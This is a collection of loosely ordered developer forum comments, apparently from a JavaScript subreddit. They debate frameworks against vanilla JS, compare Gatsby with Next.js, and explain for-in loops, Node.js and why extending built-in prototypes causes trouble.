I'm with him, what does it do? Do I give it parameters and in generates a HTML page or something? 
... not sure what you were expecting here...
I think you'll need to do so. Not using `window.Sketchfab` is _technically_ valid, but bad practice, and I think your tooling (webpack, eslint) won't build your bundle unless you explicitly access it through `window`. Since I don't know what your configs look like, I can't say for sure. I'm just going by your error: `8:26 error 'Sketchfab' is not defined no-undef`.
`test()` is called inside the loop at the bottom. `Point` is created inside `test()` for the slow example.
sure, here's a filterable list that uses both: https://jsfiddle.net/wpxmqdae/
I'm 29 now. 2 Years Ago, I was working at a resort, not doing development or programming. I'm now running a team of web developers (even though I'm the only non-college grad on the team). Also, I'm in the 'it's okay to' pay for your tutorials boat. Udemy often has sales for $10/course. I learnt iOS programming from Udacity and am very glad I did it, despite the price tag. Although, I've spent countless hours watching youtube tutorials and doing free courses as well. Take any opportunity to learn, it will only end up paying off in the long run. In fact, the important thing is to COMMIT to learning, never stop, if you do this you'll quickly surpass those who haven't made that commitment. There's plenty of room in this party for someone to join.
I'd use this.
"more" is an understatement, when we talk chinese!! love vuejs for minimalism and fantastic MVVM.
where would you fit it in, world likes all this in Python. Any production example!
Sorry, was very drunk lol
It is indeed intended. I'm looking into querying multiple elements on the page soon. Thanks for the feedback.
This just a UI framework, means just the frontend. The backend could be any language.
Huh! 25 already?! No, chance. Really, you're way too old and you should look for the grave you want to have. Sorry, just kidding. Of course you can start to learn JavaScript! 25 is not that old and you should just start learning (instead of wondering whether you could learn).
`addEventListener`, for example, is a higher order function, because it takes a function as an argument. el.addEventListener("click", function () { // ... }, false); Probably you just referred to this sort of thing as "takes a callback function", or might simply say "pass a function." Personally I think the phrase "higher order function" is an overly jargony way to describe a simple thing.
Any story for localization?
Yes, sure. I'll make Bootstrap 4 compatible version too.
What advantages would this have over other static site generators?
What does this offer that next.js doesn't? 
Why would we want to style only first element?
@drcmda, @mdboop, thank you. I appreciate your help. Everything is as expected.
The answer is: yes, of course you can. https://www.google.de/search?q=tree+to+flat+array https://stackoverflow.com/questions/32609284/construct-flat-array-from-tree-of-objects
Will be releasing an update today for this
We are missing a lot of code, but here is where I ended up. https://pastebin.com/hb9NZ3mN
If you're spooked by benchmarks that have little bearing on the real world, Fiber won't please you. You might wanna watch through Dominic Gannaways talk regarding benchmarks (as i've mentioned he's Infernos creator aka trueadm): https://www.youtube.com/watch?v=djOc1EK07Tk You can actually measure regressions by catering to fliping rows in benchmarks. If you think flipping rows applies to real world applications and therefore React is supposed to be "slow" you're mistaken. 
These are literally the core and most complex parts of the whole demo. They are responsible for parsing/evaluation of a cell's value. Say a cell value is "=A1+2*B2" and we need to evaluate this. Manual parsing and interpretation is not an option, so we have to resort to the built-in eval() facility. In order for eval to work, we also need to have variables representing individual other cells, so that "A1" is a valid JS variable reference. Creating A1..E5 local variables manually is too tedious, so we use a Function constructor instead. This function takes an array of argument *names* and a (string) function body, so the "...keys" corresponds to an array of all local variables for the newly constructed function. This allows us to have a function with 5x5 (named) arguments. To successfully call this new function f, we also need a way to *pass* those values in. But we do not know them at call time (they could be computed recursively on-the-fly), so instead of passing invididual cell values, we create a simple JS object wrapper for every cell value. This wrapper has an accessor "valueOf" method that is automagically called by the JS runtime to get the object's primitive representation (used for arithmetic operations). This is the layer of indirection we need to create recursion. So for the "A1" cell, we create the following object: {valueOf: function() { return valueOf("A1"); }} Whenever this object is used inside of an arithmetic expression, the valueOf("A1") will be called. And "valueOf" is our own (recursive) function that is supposed to compute the cell's true (numeric) value. Finally, we call the "f" function by passing it an array of all 25 wrapper-objects. 
For me at least, the whole React ecosystem/tools. Most of the time integrating even webpack with other static generators is a pain, and then you get huge JS bundles. Here you get all that for free, *and* code splitting. You can even get offline support optionally (Gatsby's site has it). 
Another pointless findnerd article
All native apps on both Android and iOS use this layout. Even forms with a lot of fields still have buttons on top because it is a native placement for them. This way user always sees them and can always reach them without scrolling through all content. An option for buttons at the bottom sounds like a good idea, too. On large phones it is easier to reach them there.
Exactly. Prettier is useless. It's just concerned with styling and it solves it the same was as eslint does (parse AST and push out modified code). It just doesn't offer any options. Another hipster library to not get any work done. 
Hmmm, okay that's interesting. Think I need to understand the differences better myself. The behaviour I wanted was to catch a primitive number using the `Number` constructor (for example). It's actually not a particularly relevent topic for identifying things that have been thrown, because who's throwing numbers/booleans/etc! Like I said above, it was more just an interesting edge case to solve.
Very very interesting - looks cool. I am curious to why you need the markup `&lt;ui-bot&gt;` as well as the container id? Can't you just use the container id and inject the required pieces in? 
It has been updated to now set styles on multiple elements
WebStorm has great error detection, autocomplete, and spelling corrections, I would look into getting an IDE that does something similar. A properly configured linter will help too. Also the more you do it the more it'll just become muscle memory.
Local database handing in electron js.
Your home page says "Static Progessive", could you fix the typo so I can show this around the office?
And what it does with getter?
The idea is that you can render the react server side so that the page renders instantaneously client side. There are other tools that do this, but this one has a plug-in system and is intended to be very easy to set up
No not yet I prioritised the importance of the setter as I feel its need is greater. Can you give me a situation where you would use the getter using querySelectorAll?
I do the same by using web standards and none of those "tools" and I was "good to go" years ago.
We have linters, guidelines, and editor snippets to achieve the exact opposite of craftsmanship pieces. Our code should not look unique or special. It should feel familiar to the new guy who just joined the project. It should be like every other project. It's bad when you join a project and it was just one guy typing away for a year, and he considered himself an "artist" of code. In the end it's just masturbation, this art stuff. Code artists, get over yourselves and write something practical. The guys writing pornhub don't wank at their code.
Thank you it's working. However one more question. ;) Several of my current search fields are using hidden fields, to make use of search filters, for example: &lt;input type="hidden" name="st" value="1"&gt; &lt;input type="hidden" name="ig" value="1"&gt; How do I add those correctly?
Needs a npm package. Nice lib though.
I noticed the window didn't auto scroll the next message into view when adding it off screen. Perhaps it should show a little badge stating that there are X more messages? 
Hi Kyle. I am learning react for one month and i am somewhere between beginner-to-intermediate level.I was thinking about looking at source code of some particular library to keep me informed of best practises as well as to learn how things are done to maintain scalability. Do you think iit would help me if i start looking into Gatsby code and from where can i start looking into. Any advice would be helpful.Thanks.
Scrolls away, would add something to keep scrollTop maxed. 
Would be nice if the first pitch was a tiny tiny code sample, instead of just "It's what you already love, only better." which is pretty bold, the JS ecosystem being what it is. Examples link is also a 404 btw.
Dude, I'm 40 and I'll be starting my second semester in August. My dad was 40+ when he got his Comp Sci degree. My cousin was 35 when he wrote and sold his first app without any formal education in coding. There are 50 year old miners in WV and KY who are learning to code. It's never too late. 
A view library like Preact could have saved hundred of hours of work and the need to rewrite the app from scratch in ~3 years. Keeping the size super minimal.
Good point. The reason why we really need `&lt;bot-ui&gt;` is because we are using Vue underneath and this lib is a component. But maybe we should eliminated the need for this in next version...
Are you using a particular game engine (like Phaser or Three.js)? The A* search algorithm is a good place to start. I recommend [easystar.js](https://github.com/prettymuchbryce/easystarjs). You describe your world as a grid. Each point in the grid can either be walkable or not. Then you can request the shortest path between any two points on the grid. (The library also has more advanced usages - like have a cost associated with moving through each point in the grid.) That tiled-based A* approach works well for a lot of applications, but it can be slow if you are have many enemies that are path finding on each frame or you are doing path finding in a large map. Navigation meshes are a popular solution - instead of running an A* search on a grid, you run it on a mesh. See [PatrolJS](https://github.com/nickjanssen/PatrolJS) for a three.js-powered implementation of that. You will very likely be fine with easystar, but I just figured I'd mention something more advanced too. 
Yeah, scrolling is in progress. But unread messages badge is a good idea too.
Working on it. Thanks!
So impressed you didn't need a framework to enable WebRTC, a built-in spec implemented by the browser vendor... I didn't need to buy any tools to hang a picture on the wall of my house either, because all the hard work of building the house was already done for me.
Very well written and interesting article. Personally, as a one man band, I would reach for a framework, but I can understand this approach too. One huge problem I foresee however is if team members change in future. A benefit of frameworks is that documentation is there to access easily, is backed up and open to problems on StackOverflow and provides a common ground to new developers already familiar with whatever framework it may be. You might find new devs struggling to understand the bespoke codebase more. 
Sorry about the typos. Am new to blogging and the default spellchecker in chrome as well as my proof reading didn't catch them. Have installed a better extentsion to cover this.
Cool, how are you implementing/interfacing analytics, localization, accessibility for people with disabilities, content management and delivery, isometric rendering? Are you handrolling all of those connections?
Why would they need to rewrite the app? It's using vanilla.js. assuming preact will be around in 3 years is a lot more dangerous than assuming the code you wrote today will work in 3 years
An overzelous colleague of mine posted the article here with that title as they were trying to help me as I am pretty new to sharing my opinions online. The point of the article was just to show the effort that had gone into improving Npm.
I really like this idea. However, any team that is trying this should have a very Ridgid process for coding standards, code review, and QA. I could see this getting out of hand on a lesser team. No monkey patching or cowboys
Just by personal experience I'd say. Vanilla JS = create your own framework/view library (basically). Expanding: Don't expect to be able to extend some JS code put together just to accomplish a specific task without adding complexity and bugs. Frameworks (or view libraries in this case) are created by very smart people to better organize the code and provide a set of well documented and stable APIs to perform operations that, with plain JavaScript, require several lines of code and can be written in a bunch of different ways. If your plan is to setup an app and never update it in the future than I can see how this can work, but from a business perspective it doesn't make any sense. Team will change, new people will perform stuff in different ways, and you'll end up with a huge spaghetti code full of useless stuff that would have come free with, say, Preact. Relating to your sentence "assuming preact will be around in 3 years": it doesn't matter. Your JS spaghetti stuff is already died and you will have to maintain it somehow until it blows in your face (or you end up with a full replacement of an existing view/framework library). If Preact stops its development, you can still use it and will still work as the first day you decided to use it.
I think maybe one valid criticism of it dying in 3 years would be like for example any bugs at the time would (likely?) go unfixed and then you would have to deal with that. I still think the benefits of frameworks far out-weigh the drawbacks of frameworks for a lot of if not all use cases.
it's always better to send PRs against an existing, solid, view library than trying to reinvent the wheel and have to address all the steps needed to create a view library from scratch.
We've just passed 130K subscribers at http://javascriptweekly.com/ if email counts :-)
Yup. Besides, with open-source software (and frameworks), it's *really* hard for anything to outright die out, at least compared to closed-source software.
As cool as it is to make your own thing, from a business perspective it almost never makes sense to reinvent the wheel unless you have tons of cash. They would have saved a lot of work by using React, Vue, Preact, Marko, Inferno... The bandwidth and performance overhead are minimal. You really have to optimize the shit out of vanilla code to beat Inferno. It also doesn't make sense that you'd want to save a few kbs on a video chat application. Your users are going to need good bandwidth anyway.
It's also weird how they think that a "large" framework/library like React &amp; co would increase the CPU usage of their website... Once the app is rendered, if nothing changes (like in the case of a videochat), the footprint of the view library is going to be near zero.
&gt; ***If your plan is to setup an app and never update it in the future than I can see how this can work, but from a business perspective it doesn't make any sense. Team will change,...*** I just want to emphasize these two points. Stackholders in a LONG term project should be seen as schizophrenic when getting requirements. They will give you a plan to do one thing, get half way, see a market change, panic and make you change course 30-90 degrees. All way throwing more and more features at you. Frameworks work well when the PATTERN of the code is well established. What it is going to look and feel like, you can identify which pieces you need to code and which you can just import. The issue arises when those assumptions get revoked. A framework can seriously hinder your ability to adapt if it DICTATES how something should be done. An example, you went with preact, but now the application needs to be ported to Ionic because the phone market is HUGE. Now you have to rewrite your whole app in Angular, or grab a wrapper. Well now it needs to work in Electron while keeping some of the features from the Iconic app, now you need to port your state around. My point is you dont know where the river is gonna take you when working on long term stuff. These things are tools and you need to know when and WHEN NOT to use it.
aka "Here's why we made our own framework"
Exactly
I mentioned Preact because it's part of the "React family", the approach those libraries follow make them suitable from quick prototyping to large enterprise applications. Also, they allow you to migrate your code to other platforms (native apps for instance) with minimal effort. I think this covers all your concerns. Summing up on this, having a spaghetti code application is going to limit your ability to pivot the project in other directions.
Hey all! Didn't mean to spam this subreddit with non-JS content, but just wanted to share this open-source project. :-)
&gt; Vanilla JS = create your own framework (basically). Absolutely disagree. You **don't** need a framework to write large elegant applications. You don't even **need** MVC. I have heard this dead horse argument used many times and I am not sure where it comes from. I can only guess it comes from an ignorance of application architecture and from people who have never written code without a framework. This is more to building an application than interacting with the DOM. DOM interaction is stupid simple to manage.
often "higher order function" is used to refer to functions that return another function, e.g. currying &amp; partial application.
with framework here we are including also view libraries, if this helps you understand my sentence.
no docs on graphql usage?
They didn't make a framework.
who said these guys weren't smart or that they wrote spaghetti?!? WTF kind of shade is it to assume everyone is as dumb as you are?
your assumptions are incorrect.
I'm talking about future development of the project, please at least take the time to read my posts entirely. Also, I never told they are stupid. If I have to say something I'd say they taken a decision I wouldn't never recommend for this situation.
as one man bad, the devil is in the details of every single of the millions of frameworks and libraries and dependencies (cough lpad cough). I spend far too much time researching and not doing, fuck all this garbage.
you act like caching is magic or something and only "really smart" people know how to optimize.
I would disagree. Reading the article, they seem to have created methods and functionality to deal with a common set of requirements across their website. Now, it may not be angular, and it may only be useful for them - but its still a framework.
I'll deal with your opinion.
&gt;window.console.log = emptyObj; ... &gt;var f = a.RequestFileSystem || a.webkitRequestFileSystem; ... &gt;a.contentWindow.navigator.geolocation.getCurrentPosition(n) That's enough information to dislike the code.
[removed]
How does CPU relates with cache?
for now
And when you make gross statements like "never" and "always" you are immediately wrong.
you are proving my point.
_in this situation_, **I'd never** recommend this. As I said already, please, take the time to read my posts entirely.
I give up, looks like you are having a bad day and I'm not going to become your frustration target. Have a good day.
Pleasure to meet you. As a person who has put little time or energy into studying the art of writing an essay, I don't find any merit in me critiquing the structure or composition of your work. I would like to offer you a brief explanation on why I felt compelled to write my response to your article. The title, "The Importance of the Craftsman Mindset in Software Development", is eye catching. As a moderately experienced developer, I realized I had begun to transition into the next phase of my career (and passion), when simply finishing a project was no longer satisfying. My solutions needed to be more than just complete. They needed to be clean, simple, and elegant. Craftsmanship, like so many other trades, is what separates a hobbyist from a professional. The idea that someone wrote and article on the importance of it in my trade was enticing. I didn't even read the first paragraph. I was immediately drawn to the four rules; short concise sentences I could digest in an instant that would likely foreshadow the rest of the article. I read these over and over. They were so contradictory to the promise of the articles title I felt I had to be missing something. I read the lead in to the rules over and over, "The four rules of finding work you love are as follows". I never read your essay from top to bottom. I took each of the four rules and scanned the rest of your article for statements to support these claims. At this point, I had completely forgotten about the notion of a craftsman mindset in software development. This was now a mission to identify and dispel corporate propaganda. I could go on about my experiences (and I'm sure Thunderfan1984's as well) in today's employer/employee ecosystem, but suffice it to say I've been fed my fair share of corporate shtick. I no longer lap it up as dogma like a younger me once did, and I feel compelled to raise red flags at the site of anything similar. This being said, and reading the rest of your essay from start to finish as was intended, I can see where context played a crucial role in both our thought processes and understanding. It is passion that drives us to share our discoveries in our craft. It is passion that compels us to defend it. It is passion that brought our voices together in this Sub-Reddit. Regardless of the means, you achieved with your essay what you set out to do. 
Use prettier to make it more readable https://prettier.io/playground
Where did it come from originally? 
Agreed, it's mucking around with window objects in ways that make me very uncomfortable to say the least.
[Here you go](http://lmgtfy.com/?q=Extending+built-in+object+in+JavaScript+is+really+bad%3F)
Just sick of dogmatic people who don't really know what they are talking about. The JS landscape is crap, plenty of people would be better off spending more time doing than worshipping.
We've all seen it like 45 times
It is not a framework and they explicitly said it is not across their whole website. This is a single application that resides in one spot on their site. &gt; Please note: This article and the benchmarks here are for MeetSpace’s inner application, not our marketing website. So, if you go to MeetSpace’s website, you’ll have to click “Sign in” to reach the main application, where these improvements reside. The main www site has a different architecture. I think you should read the article a bit more closely. They created a prototype to manage a WebSocket connection and two DOM events. This isn't a framework. It is a purpose built micro-application.
Sorry but I think it's rude to post this, knowing that it has no relevant content to this subreddit. I know you didn't 'mean' to spam, yet you did it? Lets work to make our communities better.
I guess it comes down to what you consider a framework. 
Hi /u/athityakumar, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
I vote they just implement some kind of fuzzy logic plugin that will guess at what they're trying to say. Then `elise` would totally be read as `else` That sounds like so much more fun.
chill out
Expedia
This is a beautiful reply, thank you! I'm now inspired to rewrite my essay (at least the introduction). 
I think the developers could write a comparison with the official `CLI`, because it's difficult to determine why I would use this one instead without diving in deeper than I would like.
check out hyperappjs
My counter point is having code that is "to rigid", is just as hazardous and one needs to be able to determine if a given suggestion is one. Think of it like this, human bones, vs caterpillar exoskeletons, vs jellyfish. Building everything would be **yes** spaghetti code. A caterpillar skeleton is what I am saying to avoid where it has to keep molting to grow because it is contained. To add new features they have to keep updating the framework version, or add more parts of its ultimately **limited** ecosystem in the greater vanilla.js ecosystem. Then one day you have wrap it in duct tape and completely melt down all the code to get another framework to add and reconstitute it into an amazing butterfly! Last one is the human. The framework parts have been limited. Custom skin organ, brain. Like, react it does one specific thing and doesn't need THE WHOLE KITCHEN SINK to work. Then you have these amazing things called birds, they have hollow custom bones, but all the parts, that's a pure custom app. Yeah a butterfly can fly, but eagles are awesome! Just my experience is in line with the article, even in enterprise. 50/50 the tool is used wrong, you get a bat and not an eagle, or worst a rather large dragonfly. Its just that people dont tend to use these things for what they were designed for. React was made to make a facebook, if you arent making a facebook you'll have a hard time. Angular for doing a crud interface, if you arent doing a crud interface you are gonna have a hard time.
This was rubbish when it was posted last time, it is rubbish now
It's a two way street. The larger the code base/device support you need the more your one man code base has to do. The devil is in programming, frameworks just avoid for a time. You meet it earlier on your own.
Why do you assume that you're going to have spaghetti code if you don't use a framework?
I base my answers on my past experiences with the companies I worked (and work) for. I may have been unlucky, but I managed to identify some common patterns that lead me to think it's not just bad luck.
https://www.npmjs.com/package/electron-sqlite3
Oh wow, is this the part where you tell everyone your knowledge of how caching works?
How would it have saved hundreds of hours of work for them? 
Still talking from my personal experience, a data driven and functional approach like the one promoted by React &amp; co is an huge time saver. Having worked with jQuery, Backbone, Ember 1 and Angular 1 code bases I noticed my team and I are much more productive when we don't have to think about side effects and race conditions. We create the app caring little to nothing about the number of wasted renders we are going to produce, once the app is in good shape, we optimize the renders to avoid wasted ones and improve performance. With this approach my current team rewrote from scratch an huge enterprise application in few months gaining massive improvements on extensibility and performance.
Why would someone need to manage content for a video conferencing application?
You're trying to see `key` as a parameter. But it's not a parameter, it's a variable declaration, much like `i` in your first for loop. You don't have to give it an initial value or increment it or anything though, the runtime does that for you as it iterates over `object`'s properties; all you have to do is consume `key`.
personally, do you always keep it as key or does it become useful to name it something pertaining to what you're trying to accomplish?
You are always managing and delivering content... You have ui messaging, help documents, buttons, notifications, profiles, user management, terms, policies, about, payment. Is all that stuff going to be hard coded in every language for each of the various deployments in different enterprise or white label situations? You probably don't want that. You'll want people in non-development roles to be able to go in and make those changes. You don't need complex stuff at the beginning, but if you want your product to scale, you don't want to have to rebuild the whole app. Edit: that also doesn't mean a big CMS app, it just means ways to manage and deliver it effectively.
You should always give your variables meaningful names. If you're iterating over an object's properties, `key` might not be a bad choice. You might also use something like `productID`, for instance, if that's what your keys are.
If you don't have a framework, you make one to combat spaghetti code. [Or, you just go ahead and do it like in the dark ages](https://twitter.com/AdamRackis/status/844289020372901888) ... * State management: dumping data into dom nodes and constructs sprinkled all over the place * Orchestration: setTimeout to wait for a fadeout until the button collapses * Optimization: thrashing the dom with unorganized read/writes for extra bad performance * Reactive: updating with wires thrown throughout the app to inform views * Components: just a big div soup with id and class hooks * Sharing: very little can be shared or re-used, if anything at all * Eco system: everything is made from scratch I'm not sure if it even occurs to those saying applications can be made in "vanilla js" that none of this is taken care of and few of it can be solved by best practices alone. You either have self-made abstractions for it, in which case you have re-created a framework, or your application will fall apart at some point.
"key" is the name of that loop's "counter" variable. Just like "i" was the name you've chosen for the previous loop. The names of identifiers are up to you. You can name your functions/parameters/variables/etc whatever you want.
Because someone else will have the same idea and include in their own library, Array.prototype.lastItem = function(cb){ ... } and you include this library and suddenly your code all breaks because your calls to lastItem aren't supplying the `cb` argument. Then someone *else* writes in *their* lib, Array.prototype.lastItem = function(offset){ ... } and now everything's just ruined. 
Hi /u/nerf_herd, please refrain from personal attacks. Thanks.
Eh, not exactly. I integrated Angular with a WebGL framework and the constant redraws using data bound to Angular and analyzed in the digest cycle completely trashed the CPU. Ended up removing Angular entirely and just updated DOM elements on demand.
Yes that can happen but that's the only issue we might face? Do we really [change it's behavior](https://stackoverflow.com/a/14034242/4991434) when we extend?
The whole argument is basically philosophical. You can find problems with having to train yourself to understand a framework, and then lost practical amounts of work having to retrain yourself because that framework had it's own representation of the final goal. That type of investment can take a cognitive load, and can be exhausting. On the other hand, if it's a framework that evolves to solve the same problem you keep running into when designing whatever it is that you're designing, then it's a godsend because you have the invisible hand of the framework blazing the trail at your side. Frameworks are basically good or bad depending on what people believe in their goals to be and whether or not those goals are shared.
one man's framework is another man's spaghetti code
not that I promote angular or anything, but they do have ways to bind data without constant updates. But again, I dropped angular because it wasn't angular after they released angular again.
Well, they say they do, but they don't work in certain edge cases, and I ended up way down in the source trying to figure out what the hell was going on. 
Really though, you dont have to extend a global to get this behaviour. Just do something like this: const lastItem = arr =&gt; arr[arr.length - 1]; lastItem([1, 2, 3]); // =&gt; 3 Much better than polluting globals.
Fair enough. The original answer was pretty much the reason why it's bad to extend globals, now you know.
definitely understandable. I moved to vuejs because angular wasn't angular anymore and I wasn't interested in the bulk of what they wanted.
I wouldn't say changing its behaviour is the most intuitive way to describe it, but technically, sort of. But the conflict problem is serious, and it can be tricky to find as a source of a bug, and when you do there's no quick fix. And when two libraries you're depending on add conflicting properties to an object they shouldn't expect to have control of, well, you're buggered.
Sorry if a noob question, but what is the difference between Gatsby and something like create-react-app? 
Ah, *that* other loop. :)
Thanks for the reply. I have not learned axios - what is it exactly? 
I'm not expert with animals and anatomy, but I really like dragons.
But in the article the author clearly stated that their UI needs were minimal, are you taking into account the learning curve for any selected framework? What about the amount of time needed to decide on which framework actually suits the needs of the task at hand? 
Wow what an asshole response. One of the reasons not to override the prototype because it is so easy to get the same behavior without doing it. 
One way of describing it is by having an example. var obj = {a: 1, b: 2, c: 3}; 'for ... in' iterates over the enumerable properties of an object. Let's assume that 'obj' has a built-in array property called 'keys' which holds the names of such properties -- '[a,b,c]'. Then the 'for .. in' loop will translate to: for (var i = 0: i &lt; obj.keys.length; i++) { var key = obj.keys[i]; console.log( obj[key] ); // displays the value } Hope this helps. 
thanks for answering...looked a bit more into it, fantastic it is. one up!!!
It makes it really hard for other people to read your code. Everybody can learn the standard methods on array, but if every project decided to extend the builtin objects, you would get really confused what is and what is not available. You end up with errors every time you write code thinking a function is there when it's not
Every app starts minimal with small UI needs, but things grow. Regarding the learning curve, I learnt the React basics in a day, the rest is just JavaScript™
It's never too late to become awesome
[removed]
 engines[this.engine.value] + this.q.value + '&amp;st=' + this.st.value;
?? If you have nothing to comment, don't spam atleast. Who cares whose site it is...your friend or f..riend
Thank you! :)
Fixed, thanks for the copy editing :-)
Fellow noob here, would also like to know
I'd be careful about bundle size. If you're only building for desktop, it will probably be fine. I haven't read much about using React and Ember together but seems like it might be unnecessary. If using RxJS, I suggest only importing the operators that you need rather than the entire library.
So because you don't understand what you are talking about JS is crap. Makes total sense.
Since JavaScript is client side, Node.JS is a server that runs using JavaScript. 
I completely agree. I think the README should be more about facts, instructions, etc. You can leave all the opinions and sales-pitching to your homepage, etc.
Yeah I do VueJS as well. Got to meet Evan last summer at Laracon, have a Vue sticker on my Mac now!
Axios is a JavaScript library made solely for ajax which makes it very very small. The axios request returns a promise and generally just makes doing ajax a real pleasure -- without importing in a giant libaray like jQuery into your project. 
If you're using Ember, I don't think it makes sense to use React, and vice versa. Redux can be used with either of them - there's the well-known [React-Redux](https://github.com/reactjs/react-redux) bindings, but also [Ember-Redux](https://github.com/ember-redux/ember-redux) as well.
Node is a JavaScript run-time environment that executes JS code server-side. What does this actually mean? Before Node, JS was used as a client-side language implemented in Web Browsers. This meant that if you wrote some JS, the only place you could run it was inside a Browser on a web page. For example, you have a JS script that only contains `console.log("Hello World");`. To see it output `Hello World`, you'd have to include the script in an HTML file, and then open that file in a browser and open the console. Contrasted to a language like Python that runs on the OS, you'd just have to enter `python script.py` from the command line to see that output. Node was introduced to fix that problem, and allow developers to run JavaScript directly on the OS instead of through a browser. Now you could just enter `node script.js` to from the command line to see the `Hello World` output. This opened up JavaScript to become a server-side language, as well as a client-side one, that could use to program scripts, or web servers because now it has access to the OS, instead of just the Browser. If your end goal is to make Tetris, Node isn't what you need. You can still learn it, and be able to make the same games, because running JavaScript in a node environment you'll still be writing the same JavaScript as you would in the browser, with the exeception of having access to some APIs you wouldn't in the Browser (e.g. `process.env.ENV_VARIABLE`). Browse through /r/LearnJavascript, there are a ton of resources and tutorials that will teach you to accomplish exactly what you want to learn. The TL;DR; is node allows you to run JS outside the browser, and if your end goal is writing games, you probably don't need node.
Node itself isn't a server, it's a runtime environment that runs Javascript. That Javascript can be a server, or it could be command line script. Saying node is a server would be like saying the Ruby Virtual Machine is a server because using Ruby for writing web applications is common.
Command-line JS interpreter, so you can run JS outside the browser. Python -&gt; python.exe Lua -&gt; lua.exe JavaScript -&gt; node.exe It also includes [some additional APIs](https://nodejs.org/api/) that aren't in the JS standard library for doing stuff like working with networking and files.
It's not a server... it's a [run-time environment](https://en.wikipedia.org/wiki/Runtime_system) that translate JavaScript code into something the OS can understand. The OS doesn't natively understand how to execute Javascript, which is why node was created. You can then use Javascript to write a server, like Express.js, but Node in itself doesn't know how to handle web requests. Read the [Wikipedia](https://en.wikipedia.org/wiki/Node.js), notably the first line: &gt; Node.js is an open-source, cross-platform JavaScript run-time environment for executing JavaScript code server-side. Note that it says it is a `run-time environment`, not a server. Again, Ruby and the RubyVM (the process that runs Ruby) are not servers themselves, the server (Unicorn, Puma, WebBrick, etc...) is run inside the RubyVM. Compared to the [Express.js wiki](https://en.wikipedia.org/wiki/Express.js). &gt; Express.js, or simply Express, is a web application framework for Node.js, released as free and open-source software under the MIT License. It is designed for building web applications and APIs.[2] It is the de facto standard server framework for Node.js. Note that Express.js "is the de facto standard server framework for Node.js". Express is the server, Node is just the process that interprets the Javascript, and tells the OS what to do.
**Node.js** Node.js is an open-source, cross-platform JavaScript run-time environment for executing JavaScript code server-side. Historically, JavaScript was used primarily for client-side scripting, in which scripts written in JavaScript are embedded in a webpage's HTML, to be run client-side by a JavaScript engine in the user's web browser. Node.js enables JavaScript to be used for server-side scripting, and runs scripts server-side to produce dynamic web page content before the page is sent to the user's web browser. Consequently, Node.js has become one of the foundational elements of the "JavaScript everywhere" paradigm, allowing web application development to unify around a single programming language, rather than rely on a different language for writing server side scripts. *** **Express.js** Express.js, or simply Express, is a web application framework for Node.js, released as free and open-source software under the MIT License. It is designed for building web applications and APIs. It is the de facto standard server framework for Node.js. The original author, TJ Holowaychuk, described it as a Sinatra-inspired server, meaning that it is relatively minimal with many features available as plugins. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/javascript/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.24
`var key` is the same as `var i` in your other example. Note that these two loops do the same thing: var letters = ['a','b','c']; for (var i=0; i&lt;letters.length; i++) { console.log(letters[i]); } for (var i in letters) { console.log(letters[i]); } https://jsfiddle.net/gg8umrna/
For development, check out nodemon.
thank you
In some ways they're quite similar. They both offer pre-configured optimized webpack and babel setups so you can just install and start building. Gatsby goes beyond that by adding plugin support so the community can maintain extensions to the webpack/babel configs. E.g. [Sass](https://www.gatsbyjs.org/docs/packages/gatsby-plugin-sass/), [Styled Components](https://www.gatsbyjs.org/docs/packages/gatsby-plugin-styled-components/), [Typescript](https://www.gatsbyjs.org/docs/packages/gatsby-plugin-typescript/), etc. See the full list of plugins [here](https://www.gatsbyjs.org/docs/plugins/). In addition to allowing extensions to the webpack/babel configuration, Gatsby also adds a lot of built-in performance optimizations. * It does a static HTML rendering of each page so the initial load is as fast as possible * automatic route-based code splitting — so when you load a route, you only load the code necessary for that route — then it lazy loads JS for other pages as you navigate around * service worker support — create-react-app also added sw support recently so in both cases, sw dramatically speed up loading a site on return visits Finally Gatsby has excellent support for pulling data from local and remote sources. You can install plugins that give you instant access to data in your components from Wordpress, Drupal, Contentful, as well as local files like markdown. With create-react-app, pulling in data is up to you so either you write code to connect to a remote API or setup your own API both of which take far more time.
I'd love to see or help build plugins in the future for simplifying localization but you have all the tools already to build localized sites e.g. * programmatic routes for creating localized paths /en-us/ /de-ch/ https://www.gatsbyjs.org/docs/creating-and-modifying-pages/ * React libraries like https://github.com/yahoo/react-intl The hosted CMS Contentful has excellent localization support which the Gatsby/Contentful source plugin supports https://using-contentful.gatsbyjs.org/
[removed]
Yeah this. In other SSGs, if you want to do anything fancy with JavaScript or CSS you have to create your own build system. With Gatsby, we inherit that all from webpack so you have full modern css/js/asset tooling support out of the box. Gatsby is much faster as well since it does prefetching of resources on the client and client side transitions. Several people have commented that clicking around a Gatsby site feels like your on a local site. And since everything is just React, adding client-side interactivity is trivial. Also React's component model really helps keep complexity constrained in larger sites.
It's like asking if it's a good idea to use `lodash` with `react`, ie it's generally fine. 
There's a lot of similarities — Easy React SSR, preconfigured webpack/babel etc. The big differences are * Gatsby generates static HTML so it's trivial to put an entire Gatsby site on a CDN which dramatically speeds up the initial load * Gatsby has a sophisticated plugin system which lets you outsource a lot of common website building tasks to community code. * Next.js doesn't have any opinions on data loading. They give you an API to load data and then it's up to you. Gatsby offers a sophisticated data sourcing/transforming layer powered by plugins as well as a complete query language that lets you select/sort/filter your data in surprisingly powerful ways. Much of the time in projects is eaten up by having to do custom scripting to fetch data and process in different ways. A nice example of that is the Gatsbygram site. It's a clone of Instagram in Gatsby and all the image processing is done using Gatsby's data layer, the [Sharp](https://www.gatsbyjs.org/docs/packages/gatsby-plugin-sharp/) plugin, and a couple queries https://gatsbygram.gatsbyjs.org/
